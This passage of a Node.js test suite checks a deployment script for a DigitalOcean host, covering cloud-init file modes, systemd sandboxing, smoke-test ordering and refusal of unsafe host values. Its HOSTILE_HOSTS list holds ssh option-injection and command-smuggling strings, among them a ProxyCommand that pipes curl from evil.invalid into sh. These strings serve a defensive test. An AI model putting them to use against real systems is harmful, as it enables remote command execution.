    assert.ok(declared.includes(fn), `${fn} is defined and is not in CREATE_PRECONDITIONS -- an unrun check`);
  }
  assert.ok(declared.includes('check_image_slug'), "the image-slug precondition --plan claimed must exist");
});

test('N-5: the image-slug precondition really reads the account, and refuses a slug it does not list', async () => {
  const dir = tmpdir('imageslug');
  const server = await doServer((method, url) => {
    if (method === 'GET' && url.startsWith('/v2/images')) {
      return { body: { images: [{ slug: 'debian-12-x64' }, { slug: 'ubuntu-24-04-x64' }], links: {} } };
    }
    return { status: 404, body: {} };
  });
  try {
    const token = tokenFile(dir);
    const missing = await runApi(['image-slug', token, 'debian-13-x64'], server.base);
    assert.equal(missing.status, 1, 'a slug the account does not list must be refused');
    assert.match(missing.stderr, /is not listed in this account's own/);

    const present = await runApi(['image-slug', token, 'debian-12-x64'], server.base);
    assert.equal(present.status, 0, `a listed slug must pass: ${present.stderr}`);
  } finally {
    await server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});

test('N-5: --plan names exactly the files post-boot-assert.sh asserts, and no longer claims "every path above"', () => {
  const text = plan();
  const postBoot = readFileSync(POST_BOOT, 'utf8');
  const open = postBoot.indexOf('EXPECTED_FILES = [');
  const block = postBoot.slice(open, postBoot.indexOf(']', open));
  const files = [...block.matchAll(/f"\{(srv|sshd_conf_d)\}([^"]*)"/g)].map(
    (m) => (m[1] === 'srv' ? '/srv/heron' : '/etc/ssh/sshd_config.d') + m[2],
  );
  assert.equal(files.length, 3, `EXPECTED_FILES must be parseable, found ${JSON.stringify(files)}`);
  for (const file of files) {
    assert.ok(text.includes(file), `--plan's step E does not name ${file}, which the post-boot file asserts`);
  }
  assert.doesNotMatch(text, /The same file asserts every path above/, 'the claim that was wider than the truth');
  assert.match(text, /It asserts no other file's mode/);
});

test('N-6: cloud-init creates chain.json at the owner and mode the signer needs', () => {
  const yaml = readFileSync(CLOUD_INIT_FILE, 'utf8');
  assert.match(
    yaml,
    /- \[ install, -m, "0600", -o, purse, -g, purse, \/dev\/null, \/srv\/heron\/chain\.json \]/,
    'chain.json is created by nothing; the signer refuses to start and the beat never runs',
  );
});

test('N-6: --plan prints chain.json, and the post-boot check asserts its mode', () => {
  assert.match(plan(), /\/srv\/heron\/chain\.json\s+0600 purse:purse/);
  assert.match(readFileSync(POST_BOOT, 'utf8'), /\(f"\{srv\}\/chain\.json",\s+0o600, "purse", "purse"\)/);
});

test('N-6: the path cloud-init creates is the path heron-purse.service names', () => {
  const unit = readFileSync(path.join(PURSE_SYSTEMD_DIR, 'heron-purse.service'), 'utf8');
  const chain = /--chain (\S+)/.exec(unit);
  assert.ok(chain, 'the purse unit must name a chain file');
  assert.equal(chain[1], '/srv/heron/chain.json');
  assert.match(readFileSync(CLOUD_INIT_FILE, 'utf8'), new RegExp(chain[1].replace(/[/.]/g, '\\$&')));
});

const HOSTILE_HOSTS = [
  '-oProxyCommand=curl http://evil.invalid|sh',
  '-F/dev/null',
  'ops@203.0.113.9 -oProxyCommand=x',
  'ops@203.0.113.9;id',
  'OPS@203.0.113.9',
  'ops@203.0.113.9$(id)',
];

test('N-7: --seal refuses a HERON_HOST ssh would read as an option, or that is not [user@]host', () => {
  for (const host of HOSTILE_HOSTS) {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', 'mail-key', '--dry-run'], {
      encoding: 'utf8',
      env: { ...process.env, HERON_HOST: host },
    });
    assert.notEqual(result.status, 0, `--seal accepted HERON_HOST="${host}"`);
    assert.match(result.stderr, /HERON_HOST is/);
  }
});

test('N-7: --smoke and --status refuse the same values, before they reach ssh', () => {
  for (const mode of ['--smoke', '--status']) {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, mode], {
      encoding: 'utf8',
      env: { ...process.env, HERON_HOST: '-oProxyCommand=id' },
    });
    assert.notEqual(result.status, 0, `${mode} accepted a hostile HERON_HOST`);
    assert.match(result.stderr, /begins with '-'/);
  }
});

test('N-7: a legitimate ops@<ip> is accepted, and every ssh/scp passes its target after --', () => {
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--seal', 'mail-key', '--dry-run'], {
    encoding: 'utf8',
    env: { ...process.env, HERON_HOST: 'ops@203.0.113.9' },
  });
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /\| ssh -- ops@203\.0\.113\.9 /, 'the target must be passed after --');
  for (const line of deployText().split('\n')) {
    const trimmed = line.trim();
    const invocation = /(?:^|\|\s*|until\s+)(?:ssh|scp)\s+(.*)$/.exec(trimmed);
    if (!invocation || !/ops@|\$ssh_target/.test(invocation[1])) continue;
    assert.match(trimmed, /(^|\s)-- /, `an ssh/scp invocation with no -- separator: ${trimmed}`);
  }
});

test('section 3: the alert unit gets AF_UNIX and AF_NETLINK, with the reason in the unit', () => {
  const svc = readFileSync(path.join(DO_DIR, 'systemd', 'heron-alert@.service'), 'utf8');
  assert.match(svc, /^RestrictAddressFamilies=AF_UNIX AF_NETLINK AF_INET AF_INET6$/m);
  assert.match(svc, /varlink/i, 'the AF_UNIX reason -- nss-resolve talks to systemd-resolved over a unix socket');
  assert.match(svc, /AI_ADDRCONFIG/, 'the AF_NETLINK reason -- glibc probes the kernel for configured families');
});

test('section 3: cloud-init pins hosts: files dns, and the post-boot check asserts that exact line', () => {
  const yaml = readFileSync(CLOUD_INIT_FILE, 'utf8');
  assert.match(yaml, /hosts:\s+files dns/, 'the resolver path must be pinned, not inherited');
  assert.match(
    yaml,
    /grep -qE '\^hosts:\[\[:space:\]\]\+files dns\$' \/etc\/nsswitch\.conf/,
    'cloud-init must read it back',
  );
  assert.match(
    readFileSync(POST_BOOT, 'utf8'),
    /hosts:\[\[:space:\]\]\+files dns/,
    'the post-boot check must assert it',
  );
});

test('section 3: the post-boot check proves /usr/bin/node exists and prints its version', () => {
  const text = readFileSync(POST_BOOT, 'utf8');
  assert.match(text, /NODE_BIN="\$\{HERON_NODE_BIN:-\/usr\/bin\/node\}"/);
  assert.match(text, /\[ -x "\$NODE_BIN" \] \|\| fail/);
  assert.match(text, /"\$NODE_BIN" --version/);
});

function smokeStubs({ failAt } = {}) {
  const dir = tmpdir('smoke');
  const stubs = path.join(dir, 'stubs');
  mkdirSync(stubs);
  const orderFile = path.join(dir, 'order');
  writeFileSync(orderFile, '', 'utf8');
  const stub = (name, body) => {
    const file = path.join(stubs, name);
    writeFileSync(file, `#!/usr/bin/env bash\nprintf '%s\\n' "${name}" >> "$HERON_TEST_ORDER"\n${body}\n`, 'utf8');
    chmodSync(file, 0o755);
  };
  for (const name of [
    'smoke_assert_host',
    'smoke_firewall_effective',
    'smoke_mail_gate',
    'smoke_beat',
    'smoke_enable_timers',
  ]) {
    stub(name, failAt === name ? 'echo "smoke: refused - simulated" >&2; exit 1' : 'exit 0');
  }
  return {
    dir,
    orderFile,
    env: {
      ...process.env,
      HERON_NO_NETWORK: '1',
      HERON_STUB_DIR: stubs,
      HERON_TEST_ORDER: orderFile,
      HERON_HOST: 'ops@203.0.113.9',
      DO_TOKEN_FILE: tokenFile(dir),
    },
    order: () => readFileSync(orderFile, 'utf8').split('\n').filter(Boolean),
  };
}

test('--smoke: a failed mail drill enables NOTHING -- not the beat timer, not any other', () => {
  const f = smokeStubs({ failAt: 'smoke_mail_gate' });
  try {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--smoke'], { encoding: 'utf8', env: f.env });
    assert.notEqual(result.status, 0, 'a failed mail drill must fail --smoke');
    const order = f.order();
    assert.ok(order.includes('smoke_mail_gate'), 'the drill must have run');
    assert.ok(!order.includes('smoke_beat'), 'nothing may proceed past a failed mail drill');
    assert.ok(!order.includes('smoke_enable_timers'), 'NO TIMER may be enabled after a failed mail drill');
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('--smoke: the drill comes BEFORE the timers, and the account is read before the drill', () => {
  const f = smokeStubs();
  try {
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--smoke'], { encoding: 'utf8', env: f.env });
    assert.equal(result.status, 0, `the stubbed smoke path failed: ${result.stderr}`);
    assert.deepEqual(f.order(), [
      'smoke_assert_host',
      'smoke_firewall_effective',
      'smoke_mail_gate',
      'smoke_beat',
      'smoke_enable_timers',
    ]);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('--smoke: the mail gate refuses on a host with no sealed mail-key, and says no timer was enabled', () => {
  const text = deployText();
  const gate = text.slice(text.indexOf('smoke_mail_gate() {'), text.indexOf('smoke_beat() {'));
  assert.match(gate, /\[ ! -f \/etc\/heron\/creds\/mail-key\.cred \]/, 'the sealed credential must be the first condition');
  assert.match(gate, /systemctl start heron-alert@smoke\.service/, 'a real send, through the real unit');
  assert.match(gate, /heron-alert: sent instance=smoke id=/, 'a message id in the journal, not merely exit 0');
  assert.match(gate, /NO TIMER IS ENABLED/);
});

test('--smoke: heron-alert knows the smoke instance, so the drill arrives worded as a drill', () => {
  const result = alertDryRun('smoke');
  assert.equal(result.status, 0, result.stderr);
  assert.match(result.stdout, /subject: Heron smoke: the alert path works/);
  assert.match(result.stdout, /No timer was enabled until this message was accepted/);
});

test('the lift: without HERON_DEPLOY_CONFIRMED=1, --create refuses and reaches nothing', () => {
  const env = { ...process.env };
  delete env.HERON_DEPLOY_CONFIRMED;
  const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], { encoding: 'utf8', env });
  assert.notEqual(result.status, 0);
  assert.match(result.stderr, /HERON_DEPLOY_CONFIRMED is not 1/);
  assert.doesNotMatch(result.stderr, /not exercised against a real account/, 'the unconditional refusal is lifted');
});

test('the lift: with the word but a failing precondition, --create refuses naming that precondition', () => {
  const dir = tmpdir('lift');
  try {
    const token = path.join(dir, 'do-token');
    writeFileSync(token, 'not-a-real-token\n', 'utf8');
    chmodSync(token, 0o644);
    const sshKey = path.join(dir, 'id_ed25519.pub');
    writeFileSync(sshKey, 'ssh-ed25519 AAAAfaketest fake\n', 'utf8');
    const result = spawnSync('bash', [DEPLOY_SCRIPT, '--create'], {
      encoding: 'utf8',
      env: {
        ...process.env,
        HERON_DEPLOY_CONFIRMED: '1',
        HERON_NO_NETWORK: '1',
        HERON_DESK_IP: '203.0.113.4',
        DO_TOKEN_FILE: token,
        SSH_PUBLIC_KEY_FILE: sshKey,
      },
    });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /is mode 644, not 0600/);
  } finally {
    rmSync(dir, { recursive: true, force: true });
  }
});

test('the lift: cmd_create no longer carries the unconditional HERON_NO_NETWORK refusal', () => {
  const text = deployText();
  const create = text.slice(text.indexOf('cmd_create() {'), text.indexOf('create_sequence() {'));
  assert.doesNotMatch(
    create,
    /if \[ "\$\{HERON_NO_NETWORK:-\}" != "1" \]; then/,
    'the unconditional refusal that made the whole sequence unreachable must be gone',
  );
  assert.match(create, /for entry in "\$\{CREATE_PRECONDITIONS\[@\]\}"/, 'the preconditions must run from the array');
});

function smokeHostFixture({
  chainMode = 0o600,
  chainBody = '{"network":"mainnet"}',
  dockerFails = false,
  rootDocker = false,
} = {}) {
  const dir = tmpdir('smokehost');
  const bin = path.join(dir, 'bin');
  mkdirSync(bin);
  const write = (name, body) => {
    const file = path.join(bin, name);
    writeFileSync(file, body, 'utf8');
    chmodSync(file, 0o755);
  };
  write('sudo', '#!/usr/bin/env bash\nif [ "${1:-}" = "-u" ]; then shift 2; fi\nexec "$@"\n');
  write(
    'systemd-run',
    `#!/usr/bin/env bash
while [ "\${1:-}" != "\${1#--}" ]; do shift; done
if [ "\${HERON_FIXTURE_DOCKER_FAILS:-}" = "1" ]; then
  echo "Failed to connect to the docker socket" >&2
  exit 1
fi
echo "28.0.1"
exit 0
`,
  );
  write('docker', '#!/usr/bin/env bash\necho "28.0.1"\n');

  const srv = path.join(dir, 'srv-heron');
  mkdirSync(srv);
  const chain = path.join(srv, 'chain.json');
  writeFileSync(chain, chainBody, 'utf8');
  chmodSync(chain, chainMode);

  const rootHome = path.join(dir, 'root');
  mkdirSync(rootHome);
  if (rootDocker) mkdirSync(path.join(rootHome, '.docker'));

  return {
    dir,
    chain,
    env: {
      ...process.env,
      PATH: `${bin}:${process.env.PATH}`,
      HERON_SRV_ROOT: srv,
      HERON_ROOT_HOME: rootHome,
      HERON_DOCKER_BIN: path.join(bin, 'docker'),
      HERON_SYSTEMD_RUN: path.join(bin, 'systemd-run'),
      ...(dockerFails ? { HERON_FIXTURE_DOCKER_FAILS: '1' } : {}),
    },
  };
}

test('step 9: smoke-assert.sh passes on a good fixture and names the step-10 check it cannot make', () => {
  const f = smokeHostFixture();
  try {
    const result = spawnSync('bash', [SMOKE_ASSERT], { encoding: 'utf8', env: f.env });
    assert.equal(result.status, 0, `smoke-assert.sh failed: ${result.stderr}`);
    assert.match(result.stdout, /readable and parsable as uid 10002/);
    assert.match(result.stdout, /docker answered from inside ProtectSystem=strict/);
    assert.match(result.stdout, /ProtectHome=yes hides nothing the beat needs/);
    assert.match(result.stdout, /STEP 10, not asserted here - unattended-upgrades/);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('step 9: an unparsable chain.json refuses, because the signer reads it at start', () => {
  const f = smokeHostFixture({ chainBody: 'not json at all' });
  try {
    const result = spawnSync('bash', [SMOKE_ASSERT], { encoding: 'utf8', env: f.env });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /is not parsable JSON read as uid 10002/);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('step 9: a docker socket unreachable under ProtectSystem=strict refuses, naming the fallback', () => {
  const f = smokeHostFixture({ dockerFails: true });
  try {
    const result = spawnSync('bash', [SMOKE_ASSERT], { encoding: 'utf8', env: f.env });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /docker socket is NOT reachable/);
    assert.match(result.stderr, /ReadWritePaths=\/run\/docker\.sock/, 'the one-line fallback must be named');
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('step 9: a ~/.docker the beat unit could not see under ProtectHome refuses', () => {
  const f = smokeHostFixture({ rootDocker: true });
  try {
    const result = spawnSync('bash', [SMOKE_ASSERT], { encoding: 'utf8', env: f.env });
    assert.notEqual(result.status, 0);
    assert.match(result.stderr, /\.docker exists, and heron-beat\.service runs as root under ProtectHome=yes/);
  } finally {
    rmSync(f.dir, { recursive: true, force: true });
  }
});

test('step 9: --smoke reads the effective ruleset for the tag from the ACCOUNT, not from one echo', async () => {
  const dir = tmpdir('effective');
  const server = await doServer((method, url) => {
    if (method === 'GET' && url === '/v2/firewalls') {
      return {
        body: {
          firewalls: [
            {
              id: 'fw-1',
              name: 'heron-first-fw',
              tags: ['heron-v2'],
              inbound_rules: [{ protocol: 'tcp', ports: '22', sources: { addresses: ['203.0.113.4'] } }],
              outbound_rules: [],
            },
            {
              id: 'fw-2',
              name: 'somebody-elses-fw',
              tags: ['heron-v2'],
              inbound_rules: [{ protocol: 'tcp', ports: '80', sources: { addresses: ['0.0.0.0/0'] } }],
              outbound_rules: [],
            },
          ],
        },
      };
    }
    return { status: 404, body: {} };
  });
  try {
    const result = await runApi(['firewall-effective', tokenFile(dir), 'heron-v2'], server.base);
    assert.equal(result.status, 0, result.stderr);
    assert.match(result.stdout, /2 firewall\(s\)/);
    assert.match(result.stdout, /somebody-elses-fw/);
    assert.match(result.stdout, /inbound {2}tcp\/80/);
  } finally {
    await server.close();
    rmSync(dir, { recursive: true, force: true });
  }
});
